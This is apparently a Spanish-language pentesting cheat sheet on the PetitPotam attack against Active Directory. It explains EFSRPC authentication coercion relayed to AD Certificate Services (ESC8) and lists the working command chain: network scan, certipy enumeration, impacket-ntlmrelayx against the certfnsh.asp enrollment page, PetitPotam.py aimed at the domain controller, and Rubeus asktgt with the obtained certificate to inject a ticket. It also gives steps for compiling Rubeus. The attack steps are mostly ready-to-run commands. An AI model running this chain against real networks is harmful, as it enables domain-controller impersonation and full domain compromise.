# PetitPotam 

Tags: #AD #PetitPotam #LDAP 

El **PetitPotam** es un ataque de **coerción de autenticación NTLM** que se utiliza junto con **NTLM Relay** para comprometer **Active Directory**. Primero, el atacante fuerza a un **Domain Controller** u otro servidor Windows a autenticarse hacia una máquina controlada por él explotando la interfaz **EFSRPC** mediante la herramienta **PetitPotam**. Esto provoca que el servidor víctima intente conectarse al atacante usando **NTLM**. Cuando se inicia el handshake, se genera un **NetNTLM challenge-response**, y en lugar de capturarlo para crackearlo, el atacante lo reenvía en tiempo real a otro servicio, normalmente **LDAP** del **Domain Controller**, utilizando **ntlmrelayx** del framework **Impacket**. Si el relay tiene éxito y el servidor permite autenticación NTLM sin protecciones como **LDAP signing** o **EPA**, la herramienta puede ejecutar acciones sobre **Active Directory**, como crear una cuenta de máquina y configurar **Resource-Based Constrained Delegation (RBCD)**, lo que permite al atacante posteriormente impersonar usuarios privilegiados mediante Kerberos y escalar privilegios dentro del dominio. La vulnerabilidad es ESC8.

* [PetitPotam](https://github.com/topotam/PetitPotam)

```bash
❯ nmap -p 80,443 192.168.1.0/24   # Buscar servidores con IIS u otro servicio web 
```

```bash 
❯ curl http://IP/certsrv/    # Saber si la máquina víctima tiene activado 'Microsoft Active Directory Certificate Services'

# Otra forma de hacerlo si ya se tienen credenciales de algun usuario de dominio para identificar la máquina que tiene el CA 
❯ certipy find -u user@domain -p password -dc-ip DC_IP
```

```bash 
❯ impacket-ntlmrelayx -debug -smb2support --target http://IP/certsrv/certfnsh.asp --adcs --template domaincontroller
	# debug = Modo verbose activado 
	# target = 
	# adcs = Decir que el objetivo es Active Directory Certificate Services
	# template = La plantilla "DomainController" o "KerberosAuthentication" permite solicitar un certificado válido para autenticación Kerberos del DC.
```

```bash 
❯ python3 PetitPotam.py IP_Kali IP_DC    # Ejecutar el ataque y el certificado se guarda en un archivo como 'dc01.pfx'
	# IP_Kali = Dirección IP de la máquina atacante 
	# IP_Dc = Dirección IP del DC

Nota:
	- Si el ataque fue exitoso, se obtendrá un certificado que se puede usar con Rubeus para solicitar un TGT.
```

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

# Ejecutar como usuario del dominio sin privilegios para obtener el TGT y la clave de sesión 
❯ .\Rubeus.exe asktgt /user:DC01$ /certificate:dc01.pfx /ptt

❯ klist    # Mirar los tickets 
```

